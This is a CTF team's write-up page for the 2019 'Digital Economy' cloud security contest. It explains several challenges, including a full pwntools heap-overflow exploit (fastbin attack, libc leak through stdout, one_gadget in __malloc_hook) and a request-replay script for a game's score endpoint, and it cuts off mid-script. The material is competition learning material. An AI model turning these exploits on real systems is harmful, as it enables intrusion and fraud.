<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>“数字经济”云安全共测大赛 | r00t信息安全战队</title>
    <meta name="generator" content="VuePress 1.9.9">
    
    <meta name="description" content="分享 | 求知 | 提升">
    
    <link rel="preload" href="/assets/css/0.styles.e8e4f3a3.css" as="style"><link rel="preload" href="/assets/js/app.1eac7796.js" as="script"><link rel="preload" href="/assets/js/2.da4aa226.js" as="script"><link rel="preload" href="/assets/js/11.c5844bad.js" as="script"><link rel="prefetch" href="/assets/js/10.6818eed9.js"><link rel="prefetch" href="/assets/js/12.54862c7d.js"><link rel="prefetch" href="/assets/js/13.dd8c8750.js"><link rel="prefetch" href="/assets/js/14.617bb0c2.js"><link rel="prefetch" href="/assets/js/15.f27cce8c.js"><link rel="prefetch" href="/assets/js/16.979d9069.js"><link rel="prefetch" href="/assets/js/17.97839523.js"><link rel="prefetch" href="/assets/js/18.55f9e085.js"><link rel="prefetch" href="/assets/js/19.0b3f3b95.js"><link rel="prefetch" href="/assets/js/20.23bc5ab1.js"><link rel="prefetch" href="/assets/js/21.af5f5ba5.js"><link rel="prefetch" href="/assets/js/22.f640f616.js"><link rel="prefetch" href="/assets/js/23.f69547ef.js"><link rel="prefetch" href="/assets/js/24.6e00637a.js"><link rel="prefetch" href="/assets/js/25.6fb26861.js"><link rel="prefetch" href="/assets/js/26.c2d2abef.js"><link rel="prefetch" href="/assets/js/27.cb617287.js"><link rel="prefetch" href="/assets/js/28.639cddd1.js"><link rel="prefetch" href="/assets/js/29.1c62d8ae.js"><link rel="prefetch" href="/assets/js/3.0f769c09.js"><link rel="prefetch" href="/assets/js/30.7cbff6e2.js"><link rel="prefetch" href="/assets/js/31.6a66925e.js"><link rel="prefetch" href="/assets/js/32.d8004455.js"><link rel="prefetch" href="/assets/js/33.8ec69a13.js"><link rel="prefetch" href="/assets/js/34.4a42a1bd.js"><link rel="prefetch" href="/assets/js/4.ddc6d2f6.js"><link rel="prefetch" href="/assets/js/5.175964b3.js"><link rel="prefetch" href="/assets/js/6.da13883d.js"><link rel="prefetch" href="/assets/js/7.0de84f15.js"><link rel="prefetch" href="/assets/js/8.c6432f97.js"><link rel="prefetch" href="/assets/js/9.72c27c98.js">
    <link rel="stylesheet" href="/assets/css/0.styles.e8e4f3a3.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">r00t信息安全战队</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/finance.html" class="nav-link">
  财务公开
</a></div><div class="nav-item"><a href="/kb/" class="nav-link">
  知识库
</a></div><div class="nav-item"><a href="/writeup/" class="nav-link router-link-active">
  WriteUp
</a></div><div class="nav-item"><a href="/wiki/" class="nav-link">
  原 Wiki
</a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>“数字经济”云安全共测大赛</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/writeup/2019-gongce.html#findme" class="sidebar-link">findme</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-gongce.html#ewn" class="sidebar-link">ewn</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-gongce.html#签到" class="sidebar-link">签到</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-gongce.html#fkroman" class="sidebar-link">fkroman</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-gongce.html#gameapp" class="sidebar-link">gameapp</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/writeup/2019-gongce.html#inject4fun" class="sidebar-link">Inject4Fun</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="数字经济-云安全共测大赛"><a href="#数字经济-云安全共测大赛" class="header-anchor">#</a> “数字经济”云安全共测大赛</h1> <p>“侯表哥救救我们</p> <h2 id="findme"><a href="#findme" class="header-anchor">#</a> findme</h2> <p>题目脚本意思：两百次内猜中一个 0-2^(16*8)的数，然后猜测有一定的限制。</p> <p>仔细分析限制条件，每次猜测给出一个范围和两个数，这两个数的差不能超过范围的三分之一。然后没猜中会返回一个奇怪的式子的结果。</p> <p>当 g1g2 在 sky 和 ground 之间时，这个式子代表了 secret 是否在 g1g2 之间，所以猜测时可以将 g1g2 紧贴范围的顶点，进行类似二分的搜索。</p> <p>因为分割只能进行 1:2 的分割，比起 1:1 的均分在极端情况下查找的次数会多得多，（二分正好 128 次左右）所以尝试几次之后猜对 secret 得到 flag。</p> <p>拿出没做出 pwn 的 pwntools 写脚本求得：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'info'</span><span class="token punctuation">)</span> <span class="token comment">#debug</span>
address <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'address'</span><span class="token punctuation">:</span> <span class="token string">'121.40.216.20'</span><span class="token punctuation">,</span> <span class="token string">'port'</span><span class="token punctuation">:</span><span class="token number">9999</span> <span class="token punctuation">}</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span>address<span class="token punctuation">[</span><span class="token string">'address'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> address<span class="token punctuation">[</span><span class="token string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">##################################################################</span>

<span class="token keyword">def</span> <span class="token function">gess</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span>r<span class="token punctuation">,</span>m<span class="token punctuation">,</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;g&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;s&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> k<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>
        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;g1&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;g2&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>l<span class="token operator">+</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">elif</span> k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>
        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;g1&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>r<span class="token operator">-</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&quot;g2&quot;</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    l <span class="token operator">=</span> <span class="token number">0</span>
    r <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">199</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        m <span class="token operator">=</span> <span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">3</span>
        gess<span class="token punctuation">(</span>l<span class="token punctuation">,</span>r<span class="token punctuation">,</span>m<span class="token punctuation">)</span>
        s <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">:</span>
            r<span class="token operator">=</span>l<span class="token operator">+</span>m
        <span class="token keyword">elif</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span><span class="token string">&quot;2&quot;</span><span class="token punctuation">:</span>
            l<span class="token operator">=</span>l<span class="token operator">+</span>m
        <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token keyword">print</span> <span class="token string">'--&gt;'</span><span class="token operator">+</span>s
    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><h2 id="ewn"><a href="#ewn" class="header-anchor">#</a> ewn</h2> <p>下载后发现有一堆 small 和 big 结尾的图片文件，猜测是个二维码，于是先尝试把 big 结尾的拖进 photoshop 像小时候玩拼图一样拼好扫出来就是 flag。</p> <p><img src="/assets/img/2019-gongce-1.cb47b67c.png" alt="ewn"></p> <h2 id="签到"><a href="#签到" class="header-anchor">#</a> 签到</h2> <p>C-C C-V</p> <h2 id="fkroman"><a href="#fkroman" class="header-anchor">#</a> fkroman</h2> <p>漏洞点在 edit 函数未检查申请堆块大小造成堆溢出。</p> <p>利用思路如下：</p> <ol><li><p>通过修改块 size&gt;0x60 使之符合 unsortedbin 大小，在修改之前先将此块放入 fastbin 中，这样我们就在块内获得了一个 libc 地址</p></li> <li><p>修改<code>_IO_2_1_stdout_</code>结构体中的 flag 域，通过 fastbin attack 覆写 stdout 泄露 libc 地址，</p></li> <li><p>向<code>__malloc_hook</code>写入 one_gadget</p></li></ol> <p>脚本如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment">#!/usr/bin/env python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.40.246.48'</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc-2.23.so'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;choice:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;1&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;choice:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;4&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;choice:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;3&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

    alloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span>

    free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
    free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    free<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

    edit<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x2</span><span class="token punctuation">,</span>p16<span class="token punctuation">(</span><span class="token number">0x55dd</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>
    payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">'\x00'</span>
    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    leak<span class="token operator">=</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Done'</span><span class="token punctuation">)</span>
    leak_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>leak<span class="token punctuation">[</span><span class="token number">0x41</span><span class="token punctuation">:</span><span class="token number">0x49</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    base<span class="token operator">=</span>leak_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>

    alloc<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>
    free<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
    free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>base<span class="token operator">+</span><span class="token number">0x3c4aed</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x13</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf1147</span><span class="token operator">+</span>base<span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    alloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            main<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br></div></div><h2 id="gameapp"><a href="#gameapp" class="header-anchor">#</a> gameapp</h2> <p>首先下载附件看到是一个.app.1 包，删除后缀，在夜神模拟器进行安装</p> <p>打开游戏看到需要输入服务器 ip 以及端口，尝试了一下题目的地址，由于游戏名不知道，直接默认，点击后成功进入游戏</p> <p>飞机根本操作不了，重玩了好几把才终于击落了两个飞机，使用 burp 配置代理抓取数据包</p> <p>丢到 reapeter 中发现，回来的数据包一直数字不变，不过可以看到有不同的 set-cookies 返回</p> <p>经过积分 1，积分 2 数据包反复重放对比，终于找到规律，将数据包请求之后的返回包中 set-cookies 设置的值替换过来即可进入下一个积分</p> <p>所以直接编写脚本如下：</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token keyword">import</span> requests

header <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'Content-type'</span><span class="token punctuation">:</span> <span class="token string">'xxx'</span><span class="token punctuation">,</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Dalvik/2.1.0 (Linux; U; Android 5.1.1; HUAWEI MLA-AL10 Build/HUAWEIMLA-AL10)'</span><span class="token punctuation">,</span>
    <span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'121.40.219.183:9999'</span><span class="token punctuation">,</span>
    <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
    <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
    <span class="token string">'Cookie'</span><span class="token punctuation">:</span> <span class="token string">'session=eyJwbGF5ZXIiOiJQbGF5ZXJOYW1lIiwic2NvcmUiOjN9.XYRDIg.IxzGYzPZL0GGiTmPWeaHRWi9Bo8'</span><span class="token punctuation">,</span>
    <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'175'</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&quot;__main__&quot;</span><span class="token punctuation">:</span>
    postdata <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
    kHqOwFut23Wuwj9cj+W3xhpOwF1aktFQPzl4uctY0/LKZjtcmfKc+HAAzY7y2aeRAYR1xw0zKAU6
    tdvPEpJPTXX5yEOU9nhQfcZkevMXWrV6MZPo2OuERrgS9GwIMsOAqW3VWPfwljkxvW6IbysROrGf
    Fb8QYfWKoY/Q/7YDE2o=
    '''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">99999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">&quot;http://121.40.219.183:9999/score/&quot;</span><span class="token punctuation">,</span>data<span class="token operator">=</span>postdata<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span>
        newcookie <span class="token operator">=</span> data<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">&quot;Set-Cookie&quot;</span><span class="token punctuation">]</span>
